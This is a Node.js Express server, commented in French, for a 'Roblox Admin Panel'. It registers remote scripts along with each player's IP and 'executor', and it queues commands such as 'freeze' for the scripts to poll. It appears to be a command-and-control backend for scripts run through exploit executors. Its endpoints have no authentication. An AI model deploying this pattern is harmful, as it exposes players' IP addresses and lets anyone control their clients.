// server.js - Serveur Backend pour Panel Roblox
const express = require('express');
const cors = require('cors');
const app = express();

app.use(cors());
app.use(express.json());

// Base de données en mémoire
const players = new Map();
const commands = new Map();

// Nettoyer les joueurs inactifs toutes les 30 secondes
setInterval(() => {
    const now = Date.now();
    for (const [userid, player] of players.entries()) {
        if (now - player.lastHeartbeat > 15000) {
            player.online = false;
        }
    }
}, 30000);

// API Endpoint principal
app.post('/api', (req, res) => {
    const { action, userid, username, executor, ip, game, gameId, jobId } = req.body;

    if (action === 'register') {
        // Enregistrer un nouveau joueur
        players.set(userid, {
            userid,
            username,
            executor,
            ip,
            game,
            gameId,
            jobId,
            online: true,
            lastHeartbeat: Date.now(),
            registeredAt: Date.now()
        });
        console.log(`[REGISTER] Joueur ${username} (${userid}) connecté`);
        return res.json({ success: true });
    }

    if (action === 'heartbeat') {
        // Mettre à jour le heartbeat
        const player = players.get(userid);
        if (player) {
            player.lastHeartbeat = Date.now();
            player.online = true;
        }
        return res.json({ success: true });
    }

    res.json({ success: false });
});

// Endpoint pour que le script récupère les commandes
app.get('/api', (req, res) => {
    const { userid } = req.query;
    
    if (!userid) {
        return res.json({ error: 'userid required' });
    }

    // Vérifier s'il y a une commande en attente
    const command = commands.get(userid);
    
    if (command) {
        // Supprimer la commande après l'avoir envoyée
        commands.delete(userid);
        console.log(`[COMMAND] Envoi de la commande "${command.command}" au joueur ${userid}`);
        return res.json(command);
    }

    res.json({});
});

// Endpoint pour obtenir la liste des joueurs (pour le panel web)
app.get('/api/players', (req, res) => {
    const playersList = Array.from(players.values()).map(player => ({
        ...player,
        online: Date.now() - player.lastHeartbeat < 15000
    }));
    res.json({ players: playersList });
});

// Endpoint pour envoyer une commande à un joueur (depuis le panel web)
app.post('/api/command', (req, res) => {
    const { userid, command, reason, assetId } = req.body;

    if (!userid || !command) {
        return res.json({ success: false, error: 'userid and command required' });
    }

    // Stocker la commande pour ce joueur
    const commandData = { command };
    
    if (reason) commandData.reason = reason;
    if (assetId) commandData.assetId = assetId;

    commands.set(userid, commandData);
    
    console.log(`[COMMAND] Commande "${command}" ajoutée pour le joueur ${userid}`);
    res.json({ success: true });
});

// Endpoint pour obtenir les stats
app.get('/api/stats', (req, res) => {
    const totalPlayers = players.size;
    const onlinePlayers = Array.from(players.values()).filter(p => 
        Date.now() - p.lastHeartbeat < 15000
    ).length;

    res.json({
        totalPlayers,
        onlinePlayers,
        pendingCommands: commands.size
    });
});

// Page d'accueil simple
app.get('/', (req, res) => {
    res.send(`
        <html>
            <head>
                <title>Roblox Admin Panel API</title>
                <style>
                    body {
                        font-family: Arial, sans-serif;
                        max-width: 800px;
                        margin: 50px auto;
                        padding: 20px;
                        background: #1a1a2e;
                        color: #eee;
                    }
                    h1 { color: #00d9ff; }
                    .endpoint {
                        background: #16213e;
                        padding: 15px;
                        margin: 10px 0;
                        border-radius: 8px;
                        border-left: 4px solid #00d9ff;
                    }
                    code {
                        background: #0f3460;
                        padding: 2px 6px;
                        border-radius: 4px;
                    }
                </style>
            </head>
            <body>
                <h1>🎮 Roblox Admin Panel API</h1>
                <p>Serveur opérationnel ! Voici les endpoints disponibles :</p>
                
                <div class="endpoint">
                    <h3>POST /api</h3>
                    <p>Utilisé par le script Roblox pour s'enregistrer et envoyer des heartbeats</p>
                    <code>{ action: "register", userid: ..., username: ... }</code>
                </div>

                <div class="endpoint">
                    <h3>GET /api?userid=123</h3>
                    <p>Utilisé par le script Roblox pour récupérer les commandes</p>
                </div>

                <div class="endpoint">
                    <h3>GET /api/players</h3>
                    <p>Récupérer la liste de tous les joueurs connectés</p>
                </div>

                <div class="endpoint">
                    <h3>POST /api/command</h3>
                    <p>Envoyer une commande à un joueur</p>
                    <code>{ userid: 123, command: "freeze" }</code>
                </div>

                <div class="endpoint">
                    <h3>GET /api/stats</h3>
                    <p>Obtenir les statistiques du serveur</p>
                </div>
            </body>
        </html>
    `);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`🚀 Serveur Roblox Admin Panel démarré sur le port ${PORT}`);
    console.log(`📡 API disponible sur http://localhost:${PORT}/api`);
});